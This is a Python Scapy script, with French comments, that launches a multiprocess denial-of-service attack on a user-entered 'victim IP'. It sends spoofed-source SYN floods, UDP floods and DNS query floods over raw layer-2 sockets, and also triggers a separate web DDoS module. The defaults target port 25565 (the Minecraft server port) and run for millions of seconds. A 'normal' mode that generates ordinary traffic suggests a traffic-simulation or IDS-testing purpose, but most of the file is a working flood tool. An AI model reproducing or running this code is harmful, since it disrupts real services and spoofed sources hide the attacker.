import time
import random
import os
import threading
import multiprocessing
from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR, conf, Ether, ARP, srp1, get_working_ifaces
import signal

conf.verb = 0
start_time = 0
ddos_process = None
processes_ids = None

def signal_handler(signum, frame):
    global ddos_process
    if ddos_process is not None:
        print("ddos_process NOT NONE!")
        if processes_ids is not None:
            print("process_ids NOT NONE!")
            for process_id in processes_ids:
                os.kill(int(process_id), 3)
        ddos_process.terminate()
        exit(0)

def get_mac(ip):
    try:
        # Envoie une requête ARP pour obtenir l'adresse MAC associée à l'adresse IP
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        response = srp1(arp_request_broadcast, timeout=10, verbose=False)

        if response:
            return response.hwsrc
    except:
        pass
    return None

def generate_traffic(destination_ip, destination_port, packet_count):
    while True:
        protocols = ["TCP", "UDP", "ICMP"]
        print("Generation de traffic normal...")
        for _ in range(packet_count):
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            protocol = random.choice(protocols)

            if protocol == "TCP":
                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port)
            elif protocol == "UDP":
                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
            elif protocol == "ICMP":
                packet = IP(src=src_ip, dst=destination_ip) / ICMP()

            send(packet, verbose=0)
            
            time.sleep(0.001)
        time.sleep(3)

def print_statistics(dns_pckts, syn_pckts, udp_pckts, start_time):
    while True:
        time.sleep(1)
        elapsed_time = time.time() - start_time
        start_time = time.time()
        total_packets = dns_pckts.value + syn_pckts.value + udp_pckts.value
        print(f"Paquets par seconde: {total_packets / elapsed_time:.2f}")
        dns_pckts.value = 0
        syn_pckts.value = 0
        udp_pckts.value = 0

def dns_attack(processes_ids, destination_ip, dns_pckts, attack_end_time, destination_mac, interface):
    processes_ids.append(os.getpid())
    try:
        s = conf.L2socket(iface=interface)
        while time.time() < attack_end_time:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            query_name = destination_ip  # Remplacez par le nom de domaine cible

            packet =  Ether(dst=destination_mac) / IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
            s.send(packet)

            dns_pckts.value += 1
    except:
        pass

def syn_flood_attack(processes_ids, destination_ip, syn_pckts, attack_end_time, destination_port, destination_mac, interface):
    processes_ids.append(os.getpid())
    try:
        s = conf.L2socket(iface=interface)
        while time.time() < attack_end_time:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            packet = Ether(dst=destination_mac) / IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
            s.send(packet)

            syn_pckts.value += 1
    except:
        pass

def udp_lag_attack(processes_ids, destination_ip, udp_pckts, attack_end_time, destination_port, destination_mac, interface):
    processes_ids.append(os.getpid())
    try:
        s = conf.L2socket(iface=interface)
        while time.time() < attack_end_time:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            packet = Ether(dst=destination_mac) / IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
            s.send(packet)

            udp_pckts.value += 1
    except:
        pass

def generate_ddos_traffic(destination_ip, destination_mac, destination_port, attack_duration, interface):
    global start_time, processes_ids
    signal.signal(signal.SIGTERM, signal_handler)
    processes = []
    start_time = time.time()
    attack_end_time = time.time() + attack_duration
    dns_pckts = multiprocessing.Value('i', 0)
    syn_pckts = multiprocessing.Value('i', 0)
    udp_pckts = multiprocessing.Value('i', 0)

    workers = (multiprocessing.cpu_count()-1) * 3
    processes_ids = multiprocessing.Manager().list()
    count = 0
    for _ in range(workers):
        count += 1
        processes.append(multiprocessing.Process(target=dns_attack, args=(processes_ids, destination_ip, dns_pckts, attack_end_time, destination_mac, interface,), name=f"DNS-{count}"))
        processes.append(multiprocessing.Process(target=syn_flood_attack, args=(processes_ids, destination_ip, syn_pckts, attack_end_time, destination_port, destination_mac, interface,), name=f"SYN-{count}"))
        processes.append(multiprocessing.Process(target=udp_lag_attack, args=(processes_ids, destination_ip, udp_pckts, attack_end_time, destination_port, destination_mac, interface,), name=f"UDP-{count}"))

    for process in processes:
        process.start()
    
    import web_ddos
    web_ddos.launch_web_ddos(f"http://{destination_ip}")
    
    stats_thread = threading.Thread(target=print_statistics, args=(dns_pckts, syn_pckts, udp_pckts, start_time,))
    stats_thread.start()
    while True:
        try:
            time.sleep(1)
        except:
            print("blibli")
            for process_id in processes_ids:
                os.kill(int(process_id), 3)
            break
    exit(0)
   

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    try:
        normal_process, ddos_process = None, None
        if_list = get_working_ifaces()
        destination_ip = input("Enter victim IP: ")
        destination_mac = get_mac(destination_ip)
        while destination_mac is None:
            destination_ip = input("Destination is unreachable. Enter victim IP: ")
            destination_mac = get_mac(destination_ip)
        interface = input("Enter interface: ")
        while interface not in if_list:
            interface = input("Interface unavailable. Enter interface: ")
        destination_port = 25565  # Remplacez par le port de votre destination
        attack_duration = 6000000  # Durée totale de l'attaque en secondes
        normal_traffic_count = 30
        traffic_type = input("Enter 'normal' to launch normal traffic or 'attack' to launch attack traffic: ")
        
        if traffic_type.lower() == 'normal':
            print("\nSimulating normal traffic...")
            normal_process = multiprocessing.Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count,))
            normal_process.start()
        elif traffic_type.lower() == 'attack':
            print("\nSimulating attack traffic...")
            ddos_process = multiprocessing.Process(target=generate_ddos_traffic, args=(destination_ip, destination_mac, destination_port, attack_duration, interface,))
            ddos_process.start()
        else:
            print("Invalid input. Please enter 'normal' or 'attack'.")
            exit(0)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Terminating processes...")
        if normal_process is not None:
            normal_process.terminate()
        if ddos_process is not None:
            ddos_process.terminate()
    print("End.")